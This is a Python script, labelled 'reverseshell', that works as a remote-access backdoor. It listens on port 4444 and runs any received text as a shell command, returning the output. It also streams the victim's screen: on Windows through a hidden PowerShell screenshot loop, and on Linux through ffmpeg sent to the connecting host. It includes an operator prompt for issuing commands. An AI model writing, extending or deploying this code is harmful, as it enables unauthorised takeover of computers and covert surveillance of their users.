import socket, threading, os, sys, time, subprocess
from colorama import init, Fore, Style
import base64
import platform

LHOST, LPORT = "0.0.0.0", 4444
VIDEO_PORT = 5000  # New port for the video stream
conn, addr = None, None
STREAMING = False

def handle(c, a):
    global conn, addr, STREAMING
    conn, addr = c, a
    print(f"{Fore.GREEN}[+] Connected: {a[0]}{Style.RESET_ALL}")
    try:
        while True:
            data = c.recv(4096).decode()
            if not data:
                break
            print(f"{Fore.YELLOW}[<] Received: {data.strip()}{Style.RESET_ALL}")

            if data.lower() == "stream_screen":
                if STREAMING:
                    c.send(f"ERROR: Already streaming. Stop the current stream first.".encode())
                    continue

                STREAMING = True
                os_name = platform.system()
                if os_name == "Windows":
                    try:
                        c.send("Starting Windows screen stream...".encode())
                        command = 'powershell -Command "Add-Type -AssemblyName System.Drawing; Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen; $bounds = $screen.Bounds; $width = $bounds.Width; $height = $bounds.Height; while ($true) { $bitmap = New-Object System.Drawing.Bitmap $width, $height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $memoryStream = New-Object System.IO.MemoryStream; $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Jpeg); $bytes = $memoryStream.ToArray(); $base64 = [Convert]::ToBase64String($bytes); Write-Host \'START_FRAME\' + $base64 + \'END_FRAME\'; Start-Sleep -Milliseconds 50; if (!(Test-Path -Path \'stop_stream.txt\')) {$null} else { break } }" '
                        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, text=True)

                        while STREAMING:
                            if not os.path.exists('stop_stream.txt'):
                                if process.poll() is not None:
                                    break
                                try:
                                    # Read the output stream chunk by chunk
                                    line = process.stdout.readline()

                                    if line:
                                        if "START_FRAME" in line and "END_FRAME" in line:
                                            start_index = line.find("START_FRAME") + len("START_FRAME")
                                            end_index = line.find("END_FRAME")
                                            frame_data = line[start_index:end_index]
                                            try:
                                                c.sendall(("SCREEN_DATA:" + frame_data + ":END_SCREEN_DATA").encode())
                                            except socket.error as e:
                                                print(f"Error sending frame: {e}")
                                                break
                            except socket.error as e:
                                print(f"Socket error: {e}")
                                break
                            except Exception as e:
                                print(f"Error receiving output: {e}")
                                break
                        process.terminate()  # Ensure the process is terminated
                        process.wait()
                        if os.path.exists('stop_stream.txt'):
                            os.remove('stop_stream.txt')
                        c.send("Stopped Windows stream.".encode())

                    except Exception as e:
                        c.send(f"ERROR: Windows streaming exception: {str(e)}".encode())
                        print(f"ERROR: Windows streaming exception: {str(e)}")

                elif os_name == "Linux":
                    try:
                        c.send("Starting Linux screen stream...".encode())
                        command = f"ffmpeg -f x11grab -framerate 20 -i :0.0 -c:v libx264 -preset ultrafast -tune zerolatency -f mpegts tcp://{a[0]}:{VIDEO_PORT}"
                        subprocess.Popen(command, shell=True)
                        c.send(f"Linux stream started. View with ffplay tcp://{a[0]}:{VIDEO_PORT}".encode())
                        # No way to manage linux stream yet as of now
                    except Exception as e:
                        c.send(f"ERROR: Linux streaming exception: {str(e)}".encode())
                        print(f"ERROR: Linux streaming exception: {str(e)}")

                else:
                    c.send("ERROR: Unsupported operating system for screen streaming.".encode())
                    STREAMING = False
            elif data.lower() == 'stop_stream':
                if STREAMING:
                    STREAMING = False
                    os_name = platform.system()
                    if os_name == "Windows":
                        open('stop_stream.txt', 'a').close() # Signal to stop the stream

                    c.send("Stream stopped.".encode())
                else:
                    c.send("No stream running to stop.".encode())


            else:  # Execute the command and send the output
                try:
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output = proc.stdout.read() + proc.stderr.read()
                    c.send(output)
                    print(f"{Fore.GREEN}[+] Command executed and output sent.{Style.RESET_ALL}")

                except Exception as e:
                    c.send(f"ERROR: Command execution failed: {str(e)}".encode())
                    print(f"{Fore.RED}[-] Command execution failed: {str(e)}{Style.RESET_ALL}")

    except Exception as e:
        print(f"Connection error: {e}")
    print(f"{Fore.RED}[-] Disconnected.{Style.RESET_ALL}")
    conn = None
    STREAMING = False


def start():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((LHOST, LPORT))
    s.listen(5)
    print(f"{Fore.CYAN}[*] Listening on {LPORT}...{Style.RESET_ALL}")
    while True:
        c, a = s.accept()
        threading.Thread(target=handle, args=(c,a), daemon=True).start()

if __name__ == "__main__":
    threading.Thread(target=start, daemon=True).start()
    while True:
        if conn:
            try:
                cmd = input(f"{Fore.BLUE}shell@{addr[0]} > {Style.RESET_ALL}")
                if cmd.lower() == 'quit':
                    break
                conn.send(cmd.encode())

                # Simple stream control from the server.
                if cmd.lower() in ["stream_screen", "stop_stream"]:
                    print(f"{Fore.YELLOW}[*] Managing stream...{Style.RESET_ALL}")


            except (EOFError, KeyboardInterrupt):
                break
        else:
            time.sleep(0.1)
    sys.exit(0)
"# reverseshell" 
